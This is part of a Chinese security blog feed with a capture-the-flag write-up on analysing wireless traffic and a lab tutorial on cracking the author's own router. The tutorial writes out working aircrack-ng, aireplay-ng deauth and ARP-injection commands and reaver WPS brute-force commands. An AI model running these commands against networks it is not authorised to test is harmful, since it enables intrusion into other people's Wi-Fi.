title="思路解析"></a>思路解析</h5><p><code>attack.pcapng</code>记录着蜜罐系统所抓取的所有数据包，而<code>hanshake.cap</code>则是蜜罐系统抓取的黑客的握手包。本题的思路也就是通过分析<code>attack.pcapng</code>，寻找到黑客<code>mac</code>地址，然后通过<code>aircrack-ng</code>工具验证<code>hanshake.cap</code>握手包的密码，并且使用这个密码解密<code>hanshake.cap</code>的数据。通过分析解密后的<code>hanshake.cap</code>的<code>http</code>数据，找到另外一个<code>key.pcap</code>的在线下载链接，然后分析<code>key.pcap</code>，找到其中的畸形数据，也就是最终的答案。</p><h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><p><code>wireshark</code>打开<code>attack.pcapng</code>数据包，依照题意<strong>“黑客使用无线钓鱼攻击一个SSID为‘CyberPeace’的热点”</strong>，我们可以先过滤<code>SSID</code>名为<code>CyberPeace</code>的<code>Beacon</code>的信标分组(一般通过<code>Beacon</code>就可以分析出<code>AP</code>的基本信息)，过滤语句<code>wlan.fc.type_subtype == 0x0008&amp;&amp;wlan.ssid==CyberPeace</code>，如下图</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540173014585.png" alt="1540173014585"></p><h6 id="坑点一：使用时钟偏差检测AP的真伪"><a href="#坑点一：使用时钟偏差检测AP的真伪" class="headerlink" title="坑点一：使用时钟偏差检测AP的真伪"></a>坑点一：使用时钟偏差检测<code>AP</code>的真伪</h6><p>过滤之后，发现数据分组依旧多的一匹，思考了半天，网上翻阅资料一堆，隔天才找到<a href="http://drops.xmd5.com/static/drops/wireless-15128.html" target="_blank" rel="noopener">相关的资料</a>，其中有此描述</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540175874395.png" alt="1540175874395"></p><p>也就是根据 <code>IEEE802.11</code>协议中的<code>TSF</code>（<code>Time Synchronization Function</code>，定时同步功能），通过收集<code>AP</code>的<code>Beacon</code>（信标帧）或者<code>Probe response</code>（探头响应消息）来计算AP的时钟偏差，通过与特征库中储存的偏差值比较，判断此<code>AP</code>是否为无线钓鱼<code>AP</code>。</p><p>那么问题来了，<code>wireshark</code>怎么查看时间戳在哪呢？额，我们随便挑个<code>Beacon</code>的分组看看，时间戳在<code>IEEE 802.11 wireless LAN</code>的分支下（上面），如下图：</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540176058686.png" alt="1540176058686"></p><p>接着，我们继续往下观察各分组的<code>Timestamp</code>的值，一直到<code>2153</code>分组，终于观察到不同的地方</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540176332046.png" alt="1540176332046"></p><p>第<code>2153</code>分组中<code>Timestamp</code>的值为<code>0x0000000000000000</code>，与其他<code>AP</code>中<code>Beacon</code>的<code>Timestamp</code>值不同，而此时的<code>AP</code>对应<code>mac</code>地址的值为<code>88:25:93:c1:c8:eb</code>（上图显示为<code>TP-LinkT_c1:c8:eb</code>）。再查看此<code>mac</code>地址其他<code>Beacon</code>的分组包，比如序号分组为<code>2192</code>、<code>2237</code>、<code>2306</code>（<code>SN</code>的值依次为2，3，4）中的<code>Timestamp</code>的值，你会发现<code>Timestamp</code>的值均为<code>0x0000000000000000</code>。</p><p>或者更直观一点，执行过滤语句：</p><p><code>wlan.fc.type_subtype == 0x0008&amp;&amp;wlan.ssid==CyberPeace&amp;&amp;wlan.fixed.timestamp == 0x00</code>，观察下图，会发现均值<code>mac</code>地址的值为<code>88:25:93:c1:c8:eb</code>的<code>Beacon</code>，且<code>Timestamp</code>均为<code>0x0000000000000000</code>。（分析结束后，发现直接执行过滤语句<code>wlan.fixed.timestamp ==0x00</code>，也可以得到相同的结果）</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540177912309.png" alt="1540177912309"></p><p>故根据以上分析，再依照题意<strong>“并且已经得知他的握手包密码就是他的网卡地址”</strong>，我们可以确定黑客的网卡地址为<code>88:25:93:c1:c8:eb</code>，<code>hanshake.cap</code>的握手密码也应是<code>88:25:93:c1:c8:eb</code>，将这个密码写入文件<code>d1.txt</code>中，然后通过<code>aircrack-ng</code>工具验证下密码的正确与否，执行命令<code>aircrack-ng hanshake.cap -w d1.txt</code>。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540178936411.png" alt="1540178936411"></p><p>如上图结果所示，验证成功。接下来就是解开<code>hanshake.cap</code>这个<code>wpa</code>握手包里的数据了。</p><h6 id="坑点二：已知wifi密码如何正确解密cap数据包"><a href="#坑点二：已知wifi密码如何正确解密cap数据包" class="headerlink" title="坑点二：已知wifi密码如何正确解密cap数据包"></a>坑点二：已知<code>wifi</code>密码如何正确解密<code>cap</code>数据包</h6><p>这里主要有两种方法（当然还有其他的方法，比如使用<code>Cain</code>解密），一种通过<code>wireshark</code>提供的<a href="https://www.wireshark.org/tools/wpa-psk.html" target="_blank" rel="noopener">转化网址</a>，只需输入<code>ssid</code>和密码就能将其转化为<code>PSK</code>值。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540180703551.png" alt="1540180703551"></p><p>然后打开<code>wireshark</code>，依次按照步骤操作：编辑  -&gt;  首选项  -&gt;  <code>Protocols</code> -&gt;  <code>IEEE 802.11</code> ，点击<code>Edit</code></p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540181032687.png" alt="1540181032687"></p><p>然后选填<code>wpa-psk</code>，输入刚刚转化得到的<code>PSK</code>值，进行解密</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540181063404.png" alt="1540181063404"></p><p>尝试过<code>wpa-pwd</code>，发现格式错误，解密无效</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540180902963.png" alt="1540180902963"></p><p>另一种方法是通过<code>airdecap-ng</code>工具解密，执行命令<code>airdecap-ng -p 88:25:93:c1:c8:eb -e Honey hanshake.cap</code></p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540195478057.png" alt="1540195478057"></p><p>打开解密后的流量包，会发现解析出了其他协议的数据分组</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540181190099.png" alt="1540181190099"></p><p>仔细分析后，发现执行<code>http.request.method==GET</code>语句过滤后，存在个<code>key.rar</code>压缩包的下载网址</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540194252910.png" alt="1540194252910"></p><p>因为这个文件当时是通过分析出来的，然后通过在线网址直接下载的。但之前链接已经失效（自己之前的没存(╥╯^╰╥)），不过还好，左问右问，还有老哥存着<code>key.rar</code>，要了一份，在这里特别感谢<a href="https://www.jianshu.com/u/121bf0f6b3d2" target="_blank" rel="noopener">阿烨</a>老哥，谢谢。</p><p>打开压缩包，解压得到个<code>key.pcap</code>，<code>wireshark</code>打开分析，这里先将正常的预期做法，包括踩坑步骤讲述下：</p><p>打开数据包后，再仔细看看题目，其中讲到<strong>“他又发送重连请求的Malformat Frame试图崩溃我们的无线路由器”</strong>，故我们先执行过滤语句<code>wlan.addr==88:25:93:c1:c8:eb</code>过滤出黑客网卡发出的所有包。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540215449129.png" alt="1540215449129"></p><p>可以看到所有的过滤后所有的分组都是<code>Type/Subtype: Association Request (0x0000)</code>，上面讲过 <code>Association Request</code>中文释义”关联请求“，顾名思义，而黑客通过<code>Association Request</code>发送了大量的<code>Malformat</code>，企图崩溃无线路由器。而在最后一条分组中找到了答案，也就是那条<strong>“畸形数据”</strong>。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540216568389.png" alt="1540216568389"></p><p>最终答案：<code>CISCN{Z9DY20jZIyjzY5vs0UQZVUg86eMYlNMzH}</code></p><p>在其中的数据包中，我们发现黑客是使用了大量的<code>Association Request</code>发送了大量的<code>Malformat</code>攻击路由器，这其实是无线<code>AP</code>中<code>dos</code>攻击中一种<code>Association Flood Attack</code>（关联洪水攻击），简称<code>Asso攻击</code>。关于几种攻击方式，计划着之后来篇动手实践<code>fuzz</code>玩<code>AP</code>的总结(✪ω✪)。</p><h5 id="关于此题的思考"><a href="#关于此题的思考" class="headerlink" title="关于此题的思考"></a>关于此题的思考</h5><p>关于此题，看了许多资料，想了想这题的出题原理，在安全客上顺带找到一篇<a href="https://www.anquanke.com/post/id/84689" target="_blank" rel="noopener">【技术分享】基于802.11Fuzz技术的研究</a>，发现就是原出题作者写的，在此先膜下。<code>orz~</code>。</p><p>此题，那时比赛后看了许多<code>writeup</code>，基本上黑客<code>mac</code>地址都是<code>wireshark</code>提取出来，然后爆破的，而最后的畸形数据也是<code>strings key.pcap</code>出来的。自己那时也是差不多的做法，正好最近学习了一波<code>IEEE 802.11</code>，那就从原理角度梳理下这题，发现学到的东西也是不少啊。如果有其他的做法，欢迎师傅们一起讨论。</p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>不得不说，最近学习<code>IEEE 802.11</code>协议有一种快乐的感觉，虽然其中很多东西需要自己不断的搜索资料，阅读书籍，但是学习之后，再结合实验，发现学到的东西真的挺多的，那种充实感、成就感相信大家都有过，共勉吧，好好学习，天天向上。</p><p>ps:</p><p>本文由安全客原创发布  </p><p>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/162546" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162546</a>  </p><p>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习一番&lt;code&gt;IEEE 802.11&lt;/code&gt;后，从原理性角度分析一道无线流量的CTF题目。&lt;/p&gt;
    
    </summary>
    
    
      <category term="wifi" scheme="https://jianghuxia.github.io/tags/wifi/"/>
    
  </entry>
  
  <entry>
    <title>无线网络安全测试初探</title>
    <link href="https://jianghuxia.github.io/2018/10/17/%E5%B0%8F%E7%99%BD%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/"/>
    <id>https://jianghuxia.github.io/2018/10/17/小白无线网络测试初探/</id>
    <published>2018-10-17T14:22:35.000Z</published>
    <updated>2018-10-23T10:08:28.763Z</updated>
    
    <content type="html"><![CDATA[<p>随着技术的发展，无线网络<code>wifi</code>遍布每个角落，殊不知隐藏其中的风云涌动。</p><a id="more"></a> <p>这学期上了计算机网络，但是学过了其中的浅浅知识，有点无聊，正好看到<code>IEEE 802.11</code>，加上最近护网杯出了一题与无线<code>AP</code>流量包的分析题目，赛终依旧<code>0</code>解。遂自行学习一波知识，从原理入手，动手实验，归纳一番。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>AP</code>：<code>Access Point</code>,中文名”无线访问接入点“，在本篇文章中，无线路由器也指<code>AP</code>。<code>AP</code>的功能主要使无线设备能够快速轻易地与无线网络连接，是无线设备与有线局域网络的桥梁。</p><p><code>IEEE 802.11</code>协议：说起无线网络，那么就不得不提到<code>IEEE 802.11</code>标准，该协议主要用于解决终端之间的无线接入，包括<code>wifi</code>，蓝牙等等。所以，学习无线网络的相关知识，翻阅<code>IEEE 802.11</code>文档是必须的。</p><p><code>Aircrack-ng</code>：一个与<code>IEEE 802.11</code>标准的无线网络分析有关的安全软件。</p><p><code>SSID</code>：<code>Service Set Identifier</code> ，中文名为服务集标识。在本篇中，运用<code>Aircrack-ng</code>的界面中，有出现<code>BSSID</code>和<code>ESSID</code>，在其中<code>BSSID</code>指的是<code>AP</code>的<code>MAC</code>地址，<code>ESSID</code>为<code>AP</code>的名称。</p><h4 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h4><h5 id="WPS加密（Wi-FI-Protected-Setup）"><a href="#WPS加密（Wi-FI-Protected-Setup）" class="headerlink" title="WPS加密（Wi-FI Protected Setup）"></a><code>WPS</code>加密（Wi-FI Protected Setup）</h5><p>在早期的<code>wifi</code>中，人们发现<code>wifi</code>的便利性，相应地，为了维护个人或集体的数据隐私，也添加了无线网络加密认证。但由于早期的认证步骤过于繁杂，干脆不做任何加密安全的设定，从而引发许多安全问题，于是WPS加密模式应运而生。通过该模式，用户只需在每次连接无线路由器上的<code>WPS</code>按键（<code>Push Button Condiguration</code>，按钮模式）或者输入此时路由器的<code>PIN</code>码（<code>Pin Input Configuration</code>,个人识别码模式），就能将新设备加入无线网络中。</p><p>如果你听说过爆破<code>PIN码</code>，继而得到<code>wifi</code>密码这种操作也正是个人识别码模式的缺陷，或者说是<code>WPS</code>的漏洞。<code>PIN</code>码是由8位纯数字组成的，第8位为校验位，而这一位是可以通过前7位计算的。在验证PIN码时，会先检测前四位，如果验证成功，则反馈一条信息。而通过这点，爆破前四位，由反馈的信息验证，即可得到正确的前四位，剩余的四位中，因为最后一位是通过<code>PIN</code>码前7位算出的，只需再爆破后四位中的前三位，我们就可以爆破得到<code>AP</code>的<code>PIN</code>码。</p><p><code>WPS</code>也叫作<code>QSS</code>，一般在路由器的“QSS安全设置”页面即可找到。（并不是所有的无线路由器都支持<code>WPS</code>）</p><p><img src="/2018/10/17/小白无线网络测试初探/1539766546221.png" alt="1539766546221"></p><p>另外，大多数路由器默认的<code>QSS</code>是关闭的，需要手动开启。</p><h5 id="WEP加密（Wired-Equivalent-Privacy-有效等效保密协议）"><a href="#WEP加密（Wired-Equivalent-Privacy-有效等效保密协议）" class="headerlink" title="WEP加密（Wired Equivalent Privacy,有效等效保密协议）"></a><code>WEP</code>加密（Wired Equivalent Privacy,有效等效保密协议）</h5><p>说起<code>WEP</code>，大家并不陌生，在八年前那个时候，<code>wifi</code>的兴起，“蹭网“的热情，想必都经历过。虽然，<code>WEP</code>已经逐渐被<code>WPA-PSK/WPA2-PSK</code>模式取代，但是打开你的手机无线网络，相信在众多的<code>wifi</code>中，你还是能发现那么一两个<code>WEP</code>的<code>wifi</code>。</p><p><code>WEP</code>工作原理是通过使用<code>RC4</code>（Rivest Cipher）串流技术加密，并使用<code>CRC32</code>（循环冗余校验）校验和保证资料的正确性。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539769981074.png" alt="1539769981074"></p><p>如上图，<code>WEP</code>使用<code>RC4</code>的算法产生伪随机序列流，将其与要传输的明文进行<code>xor</code>运算，再利用<code>CRC</code>算法生成ICV<code>完整性校验值</code>，再将刚刚的<code>xor</code>内容和<code>ICV</code>组合在一起，完成传输。其中，<code>RC4</code>的秘钥由初始化向量<code>IV</code>（24位）和用户秘钥<code>SK</code>组成。当然，解密过程即是加密过程的逆推，首先检验CRC的值，进行完整性校验，提取出IV值，和对应的用户私钥<code>SK</code>通过<code>RC4</code>计算出伪随机序列号，进行<code>xor</code>运算，计算出<code>ICV&#39;</code>值。再通过对比原先的<code>ICV</code>值，判断数据正确性。</p><p>可以发现上述的过程中，如果攻击者获得了两段由相同的RC4密钥流序列加密后得到的密文，只需<code>xor</code>下，得到的也就是两段明文的<code>xor</code>内容，那么密钥就会失效。其次，初始化向量IV对于整个<code>RC4</code>的加密过程中，起到关键作用。先甩个国外的文档<a href="http://www.opus1.com/www/whitepapers/whatswrongwithwep.pdf" target="_blank" rel="noopener">whatswrongwithwep.pdf</a>，其中描述了IV重用问题引起的<code>WEP</code>容易被破解的关键原因。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539772396878.png" alt="1539772396878"></p><p>如果加密时使用的IV值相同，那么对于使用相同的数据帧加密密钥是不安全的。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539772788037.png" alt="1539772788037"></p><p>再者之前提到过<code>WEP</code>的初始化向量<code>IV</code>为<code>24</code>位，每个传输的数据帧任意选择其中一个<code>IV</code>值进行加密。也就是说IV的选择范围只有<code>224</code>。假设<code>IV</code>初始值设为<code>0</code>，每传送一个数据帧，<code>IV</code>值增加<code>1</code>，这样在传输<code>224</code>个数据帧后就会遇到<code>IV</code>重用问题。而导致<code>WEP</code>容易被破解的原因，正是因为这个原因，对于通讯繁忙的<code>AP</code>，很可能在短期内导致<code>IV</code>的重复使用。</p><p>再者，由于<code>IV</code>是明文传送的，因此攻击者能获得两个或多个使用相同密钥的数据帧，就可以使用静态分析来恢复明文。 下面测试的破解<code>WEP</code>过程中，<code>ArpRequest</code>注入攻击原理是就是通过读取交互设备之间的<code>ARP</code>请求报文，并伪造报文再次重发出去，从而刺激<code>AP</code>产生更多的数据包，以供抓取更多的<code>IVS</code>数据包，加快破解速度。</p><p>而对于<code>wep</code>引发的安全问题，人们也采取了以下措施：</p><p>1、使用<code>WPA-PSK/WPA2-PSK</code>模式</p><p>2、设置无线网络<code>MAC</code>地址过滤</p><h5 id="WPA-PSK-WPA2-PSK加密（Wi-Fi-Protected-Access）"><a href="#WPA-PSK-WPA2-PSK加密（Wi-Fi-Protected-Access）" class="headerlink" title="WPA-PSK/WPA2-PSK加密（Wi-Fi Protected Access）"></a><code>WPA-PSK/WPA2-PSK</code>加密（Wi-Fi Protected Access）</h5><p>说到这里，有个疑问，为什么<code>WPA-PSK/WPA2-PSK</code>加密合在一起讲呢？其实大同小异，你可以这样认为，<code>WPA</code>是为了弥补<code>WEP</code>缺陷所研究的加密模式，<code>WPA2</code>则是<code>WPA</code>的升级版本。关于<code>WPA-PSK/WPA2-PSK</code>网上有许多不错的学习链接，不再赘述，这里放两个<a href="https://blog.csdn.net/arick2013/article/details/48375751" target="_blank" rel="noopener">学习链接1</a>、<a href="https://www.cnblogs.com/chinasun021/archive/2013/01/18/2866343.html" target="_blank" rel="noopener">学习链接2</a>。</p><p>在阅读相应的文档，你会发现，<code>WPA</code>引用了<code>IEEE802.1x</code>的身份认证标准：<a href="https://www.wikiwand.com/zh-hans/%E6%89%A9%E5%B1%95%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">EAP</a>（Extensible Authentication Protocol）。其包括<a href="https://www.wikiwand.com/en/Temporal_Key_Integrity_Protocol" target="_blank" rel="noopener">TKIP</a>（临时密钥完整性协议）和<a href="https://www.wikiwand.com/en/Message_Integrity_Check" target="_blank" rel="noopener">MIC</a>（消息完整性检查）。<code>WEP</code>使用<code>64</code>位或<code>128</code>位加密密钥，必须在无线接入点和设备上手动输入，并且不会更改。<code>TKIP</code>使用每个数据包密钥，这意味着它为每个数据包动态生成一个新的128位密钥，从而防止类似攻击<code>WEP</code>的攻击方式。而<code>MIC</code>，旨在防止攻击者更改和重新发送数据包，取代了之前<code>WEP</code>标准使用的<a href="https://www.wikiwand.com/en/Cyclic_redundancy_check" target="_blank" rel="noopener">CRC</a>（循环冗余校验）。</p><p><code>WPA2</code>较<code>WPA</code>采用了更加强大的<code>AES-CCMP</code>取代<code>WPA</code>中的<code>TKIP/MIC</code>,<code>AES-CCMP</code>(AES Counter Mode CBC-MAC Protocol) 结合了两种复杂的加密技术（计数器模式和<code>CBC-MAC</code>），从而在移动客户端和接入点之间提供强大的安全协议。之所以使用<code>AES</code>，一是<code>AES</code>加密算法安全性比<code>TKIP</code>更高，而且在使用<code>TKIP</code>算法时，路由器的吞吐量会下降，进而影响到路由器的性能。</p><p>另外不得不提，今年一月份，<code>Wi-Fi</code>联盟发布了WPA3，相比较<code>WPA2</code>，又多了一些安全性的改性，有兴趣可以深入研究一番哦。</p><h4 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h4><h5 id="测试配置"><a href="#测试配置" class="headerlink" title="测试配置"></a>测试配置</h5><p>数台品牌不同的安卓手机，数台<code>PC</code>以及默认驱动为<code>rt7601u</code>型号为<code>Ralink</code>的无线网卡，<code>TP</code>路由器。</p><h5 id="外置网卡配置"><a href="#外置网卡配置" class="headerlink" title="外置网卡配置"></a>外置网卡配置</h5><p>接下来使用<code>iwconfig -a</code>的命令可以查看所有无线网卡的信息，默认的外置网卡名为<code>wlan0</code>。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606051094.png" alt="1539606051094"></p><p>使用<code>iwconfig</code>命令，可以查看<code>wlan0</code>网卡的详细信息。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606171774.png" alt="1539606171774"></p><p>但是发现该<code>wlan0</code>网卡并没有处于嗅探状态<code>monitor</code>监听模式，所以接下来需要激活网卡至<code>monitor</code>监听模式。使用<code>Aircrack-ng</code>中的<code>airmon-ng</code>工具激活，执行命令：<code>airmon-ng start wlan0</code>。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606394503.png" alt="1539606394503"></p><p>已将<code>wlan0</code>更改为<code>wlan0mon</code>，且处于<code>monitor</code>监听模式，再次执行命令<code>ifconfig</code>可以看到</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606434916.png" alt="1539606434916"></p><p>再次执行命令<code>iwconfig</code>验证是否处于<code>monitor</code>监听模式。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539689803585.png" alt="1539689803585"></p><p>可以看到网卡<code>wlan0mon</code>已经处于嗅探状态<code>monitor</code>监听模式，设置嗅探成功。</p><p>当然此时再次查看<code>wireshark</code>的抓包界面，也可以看到<code>mon0</code>。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606748048.png" alt="1539606748048"></p><p>接下来进行一些相关的测试。</p><h4 id="测试目标"><a href="#测试目标" class="headerlink" title="测试目标"></a>测试目标</h4><h5 id="测试环境一：WPA-PSK-WPA2-PSK模式"><a href="#测试环境一：WPA-PSK-WPA2-PSK模式" class="headerlink" title="测试环境一：WPA-PSK/WPA2-PSK模式"></a>测试环境一：WPA-PSK/WPA2-PSK模式</h5><p>该模式下路由配置如下，名称为<code>T35t</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539607665822.png" alt="1539607665822"></p><p>密码为<code>t35ttest</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539607498731.png" alt="1539607498731"></p><h6 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h6><p>执行命令<code># airodump-ng wlan0mon</code>查看周围无线设备，发现测试目标<code>T35t</code>（<code>T35t</code>为该路由器<code>ESSID</code>号），频道<code>11</code>以及其他信息。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539607906628.png" alt="1539607906628"></p><p>过滤语句<code>airodump-ng wlan0mon --bssid 30:FC:68:CA:13:DF -c 11</code>只查看跟该设备相关的无线信号。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539608374358.png" alt="1539608374358"></p><p>可以看到存在设备<code>mac</code>地址为<code>00:00:00:00:00:00</code>（就是那串模糊的，懂不·—·）的设备正在连接该路由器</p><p>嗯，接下来使用命令<code>airodump-ng wlan0mon --bssid 30:FC:68:CA:13:DF -c 11 -w capture_wap</code>将该信号抓取保存为前缀名为<code>capture_wap</code>的文件，执行该条命令界面运行如下：</p><p><img src="/2018/10/17/小白无线网络测试初探/1539609090135.png" alt="1539609090135"></p><p>打开新的命令行界面（注意：之前的命令行界面不要关闭），然后执行命令<code>aireplay-ng -0 1 -a 30:FC:68:CA:13:DF -c 00:00:00:00:00:00 wlan0mon</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539609764786.png" alt="1539609764786"></p><p>执行成功后，正常情况下，稍等几秒，原先界面右上角即会出现<code>WPA handshake: 30:FC:68:CA:13:DF</code>，意味着成功抓到握手包，接下来只需字典爆破握手包即可。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539609304195.png" alt="1539609304195"></p><p>执行命令<code>aircrack-ng capture_wap-01.cap</code>，查看捕获握手包数据信息。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539609717980.png" alt="1539609717980"></p><p>执行命令<code>aircrack-ng capture_wap-01.cap -w dictiontry.txt</code>，爆破字典为<code>dictiontry.txt</code>文件。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539610127880.png" alt="1539610127880"></p><p>成功找到密码<code>t35ttest</code>。</p><h6 id="测试坑点一："><a href="#测试坑点一：" class="headerlink" title="测试坑点一："></a>测试坑点一：</h6><p>执行命令<code>airodump-ng wlan0mon</code>查看周围无线设备时，如果发现界面右上角存在 <code>fixed channel mon0: -1</code>字样，那么，建议换成<code>kali</code>虚拟机重新测试吧，原因是因为操作系统内核不兼容。之前尝试<code>ubuntu16.04</code>抓握手包，半天抓不到，网上去找原因，才知道是这里出了问题。</p><h6 id="测试坑点二："><a href="#测试坑点二：" class="headerlink" title="测试坑点二："></a>测试坑点二：</h6><p>在进行<code>aireplay-ng -0 1 -a 30:FC:68:CA:13:DF -c 00:00:00:00:00:00 wlan0mon</code>这条命令时，发现了一些问题。首先，该命令是执行<code>Deauth</code>攻击加速破解过程的命令，原理是通过发送<code>Deauth</code>的数据包，将已连接至无线路由器的合法客户端强制断开，此时，客户端就会重新自动重新连接无线路由器，也就是在这个过程中，有机会获得<code>WPA-PSK</code>握手验证的完整数据包。而这条命令中<code>-0</code>参数表示采用<code>Deauth</code>攻击模式，后面紧跟着攻击次数<code>1</code>次，<code>-a</code>参数后跟AP的MAC地址，<code>-c</code>参数后跟客户端的<code>MAC</code>地址，此命令也就表示为，采用<code>Deauth</code>攻击模式，将MAC地址为<code>00:00:00:00:00:00</code>客户端与MAC地址为<code>30:FC:68:CA:13:DF</code>AP之间的通信强制断开<code>1</code>次。其次，在经过几次测试中发现，除各型号安卓机型外，苹果手机在收到<code>Deauth</code>攻击后，重新连接<code>AP</code>的时段中，抓不到相应的握手包，而其他设备，均可抓到握手包。这里排除其他原因，单纯地看,苹果手机好像略高一畴。<code>^……^</code>！</p><h5 id="测试环境二：WEP模式"><a href="#测试环境二：WEP模式" class="headerlink" title="测试环境二：WEP模式"></a>测试环境二：WEP模式</h5><p>配置的<code>AP</code>如下，设置<code>WEP</code>模式下的秘钥为<code>12345</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539700073811.png" alt="1539700073811"></p><h6 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h6><p>同样执行<code>airodump-ng wlan0mon</code>探测周围的设备</p><p><img src="/2018/10/17/小白无线网络测试初探/1539700191232.png" alt="1539700191232"></p><p>由上图可知当前目标AP的工作频道为<code>11</code>，相应地，过滤出当前<code>AP</code>可以清晰看到与当前<code>AP</code>进行连接的其他设备。</p><p>执行命令<code>airodump-ng wlan0mon --bssid 30:FC:68:CA:13:DF -c 11</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539700462910.png" alt="1539700462910"></p><p>上图可以查看详细的交互设备MAC，模糊处的MAC地址为<code>00:00:00:00:00:00</code>。</p><p>接下来抓取<code>IVS</code>数据报文，执行命令<code>airodump-ng --ivs -w capture_wep -c 11 wlan0mon --bssid 30:FC:68:CA:13:DF</code>，该条命令表示只抓取<code>bssid</code>为<code>30:FC:68:CA:13:DF</code>的<code>IVS</code>数据报文，并将其保存至前缀名为<code>capture_wep</code>的文件中。</p><p>执行完上条命令后，新开一个命令行界面，执行命令<code>aireplay-ng -3 -b 30:FC:68:CA:13:DF -h 00:00:00:00:00:00 wlan0mon</code>，该命令参数<code>-3</code> 表示采用<code>ArpRequest</code>注入攻击模式，<code>-b</code>后紧跟<code>AP</code>的<code>MAC</code>地址，<code>-h</code>后紧跟客户端<code>MAC</code>地址。<code>ArpRequest</code>注入攻击原理是通过读取交互设备之间的ARP请求报文，并伪造报文再次重发出去，从而刺激<code>AP</code>产生更多的数据包，以供抓取更多的<code>IVS</code>数据包，加快破解速度。在执行该条命令后，查看之前的界面可以发现<code>Data</code>列的数据一直在增加。</p><p>然后再新开一个界面，执行命令<code>aircrack-ng capture_wep-01.ivs</code>，<code>Aircrack-ng</code>就会自动进行破解。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539748612030.png" alt="1539748612030"></p><p>成功破解密码<code>12345</code>，耗时大概两分多钟。什么，密码设置的太简单了，那接下来设置个比较难的呗：<code>#fl?\2a&amp;*6^g{</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539701713227.png" alt="1539701713227"></p><p>按照上面的命令，依旧破解下来，也只是多花了几分钟的时间，这还是除去虚拟机的配置，<code>hhh~</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539748464553.png" alt="1539748464553"></p><p>所以如果还是<code>WEP</code>的，赶紧换<code>WPA2</code>吧，亡羊补牢，哪怕还没亡羊。</p><h5 id="测试环境三：WPS模式"><a href="#测试环境三：WPS模式" class="headerlink" title="测试环境三：WPS模式"></a>测试环境三：WPS模式</h5><p>无线路由器PIN码设置为<code>54808782</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539784367010.png" alt="1539784367010"></p><h6 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h6><p>该模式下，可以使用<code>Reaver</code>工具强制爆破<code>PIN</code>码，通过<code>PIN</code>码得到<code>wifi</code>密码。</p><p>同样先使用<code>airmon-ng start wlan0</code>进行网卡嗅探</p><p><img src="/2018/10/17/小白无线网络测试初探/1539784299745.png" alt="1539784299745"></p><p>查看到目标<code>AP</code>的<code>SSID</code>即可开始测试，这里依旧与之前的MAC地址相同：<code>30:FC:68:CA:13:DF</code></p><p>执行命令<code>reaver -i wlan0mon -b 30:FC:68:CA:13:DF -p 54808782</code>，稍等一会，即会出现以下界面</p><p><img src="/2018/10/17/小白无线网络测试初探/1539784690422.png" alt="1539784690422"></p><p>可以看到已经破解成功。当然，这是在已知<code>PIN</code>码情况下，进行的测试。在不知<code>PIN</code>码的情况下只能爆破，基本上是个几天几夜，对应的命令为<code>reaver -i wlan0mon -b 30:FC:68:CA:13:DF -vv</code>。</p><p>虽然许多路由器默认关闭<code>WPS</code>，但还是建议大家认真检查下，如果开了<code>QQS</code>，顺手把它关了吧。反正也就是举手之劳，省掉一个安全隐患，何乐不为？</p><h4 id="结语"><a href="#结语" class="headerlink" 